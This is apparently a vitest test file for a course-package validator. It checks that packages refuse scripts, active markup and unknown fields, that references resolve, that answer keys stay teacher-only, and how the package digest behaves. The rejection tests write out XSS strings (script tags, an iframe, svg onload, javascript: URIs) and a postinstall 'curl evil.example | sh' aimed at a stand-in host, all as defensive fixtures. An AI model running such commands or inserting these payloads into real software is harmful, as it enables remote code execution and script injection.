import { describe, expect, it } from "vitest";
import { OcsManifest, OcsModule, OcsResource, packageDigest, readPackage } from "../src/index.ts";
import { IDS, packageFiles, rejectsWithProblem, resource, unit } from "./helpers.ts";

const minimal = () =>
  packageFiles({
    manifest: { id: IDS.safety, version: "1.0.0", outline: [{ kind: "unit", unit: "rules" }] },
    units: [unit("rules", [{ kind: "resource", ref: "goggles" }])],
    resources: [resource("goggles", "embed")],
  });

const RELEASE = { resourceId: "rsc_bio-sim", version: "1.0.0" };
const COMMIT = "0123456789abcdef0123456789abcdef01234567";

describe("no executable content", () => {
  it("refuses any file outside the data layout, such as scripts", async () => {
    for (const path of ["scripts/setup.js", "activities/run.js", "units/rules.ts", "gadgets/sim/index.html", "package.json", ".github/workflows/ci.yml"]) {
      await rejectsWithProblem(readPackage({ ...minimal(), [path]: "{}" }), "invalid-package", /never code/);
    }
  });

  it("references a Gadget Blueprint by its release only, never with inlined files or its blueprint ID", () => {
    const blueprint = { kind: "gadget-blueprint", id: "sim", title: "Membrane simulator", release: RELEASE, releaseCommit: COMMIT, use: "embed" };
    expect(OcsResource.safeParse(blueprint).success).toBe(true);
    expect(OcsResource.safeParse({ ...blueprint, files: { "index.ts": "export default {}" } }).success).toBe(false);
    expect(OcsResource.safeParse({ ...blueprint, blueprintId: "bp_share-link" }).success).toBe(false);
    expect(OcsResource.safeParse({ ...blueprint, releaseCommit: "main" }).success).toBe(false);
    expect(OcsResource.safeParse({ ...blueprint, code: "fetch('https://evil.example')" }).success).toBe(false);
  });

  it("refuses scripts and active markup in package text", async () => {
    const hostile = [
      "Lab rules<script>fetch('https://evil.example')</script>",
      "Click <iframe src=https://evil.example>",
      "See javascript:alert(1)",
      "Open data:text/html;base64,PHNjcmlwdD4=",
      "<svg onload=alert(1)>",
    ];
    for (const title of hostile) {
      const files = { ...minimal(), "units/rules.json": JSON.stringify({ ...unit("rules", [{ kind: "resource", ref: "goggles" }]), title }) };
      await rejectsWithProblem(readPackage(files), "invalid-package", /may not contain scripts or active markup/);
    }
    // Ordinary text with comparisons and angle brackets is fine.
    const plain = { ...minimal(), "units/rules.json": JSON.stringify({ ...unit("rules", [{ kind: "resource", ref: "goggles" }]), title: "When x < 3 and y > 2" }) };
    await expect(readPackage(plain)).resolves.toBeDefined();
  });

  it("refuses unknown fields anywhere, so nothing can ride along unvalidated", async () => {
    const manifest = JSON.parse(minimal()["ocs.json"]!) as Record<string, unknown>;
    expect(OcsManifest.safeParse({ ...manifest, scripts: { postinstall: "curl evil.example | sh" } }).success).toBe(false);
    const files = { ...minimal(), "units/rules.json": JSON.stringify({ ...unit("rules", [{ kind: "resource", ref: "goggles" }]), onOpen: "alert(1)" }) };
    await rejectsWithProblem(readPackage(files), "invalid-package");
  });
});

describe("package validity", () => {
  it("requires every reference between files to resolve", async () => {
    const files = { ...minimal(), "units/rules.json": JSON.stringify(unit("rules", [{ kind: "activity", ref: "missing-quiz" }])) };
    await rejectsWithProblem(readPackage(files), "invalid-package", /there is no activity missing-quiz/);
  });

  it("requires a file's name to match the ID it holds", async () => {
    const files = { ...minimal(), "resources/visor.json": JSON.stringify(resource("goggles", "embed")) };
    await rejectsWithProblem(readPackage(files), "invalid-package", /holds goggles, but its file name says visor/);
  });

  it("keeps an answer key teacher-only", async () => {
    const files = { ...minimal(), "codex/key.json": JSON.stringify({ id: "key", title: "Answers", body: "1. b", purpose: "answer-key", visibility: "students" }) };
    await rejectsWithProblem(readPackage(files), "invalid-package", /an answer key is always teacher-only/);
  });

  it("allows a digest pin only on an exact version", () => {
    const digest = `sha256:${"a".repeat(64)}`;
    expect(OcsModule.safeParse({ name: "safety", package: IDS.safety, range: "1.2.0", digest }).success).toBe(true);
    expect(OcsModule.safeParse({ name: "safety", package: IDS.safety, range: "^1.2.0", digest }).success).toBe(false);
  });
});

describe("package digest", () => {
  it("ignores formatting, key order and the lockfile, and changes with any content", async () => {
    const files = minimal();
    const digest = await packageDigest(files);
    const reformatted = Object.fromEntries(Object.entries(files).toReversed().map(([path, text]) => {
      const value = JSON.parse(text) as Record<string, unknown>;
      return [path, JSON.stringify(Object.fromEntries(Object.entries(value).toReversed()))];
    }));
    expect(await packageDigest(reformatted)).toBe(digest);
    expect(await packageDigest({ ...files, "ocs.lock": "{}" })).toBe(digest);
    expect(await packageDigest({ ...files, "resources/goggles.json": JSON.stringify(resource("goggles", "link")) })).not.toBe(digest);
    expect(await packageDigest({ ...files, "units/extra.json": JSON.stringify(unit("extra", [])) })).not.toBe(digest);
  });
});
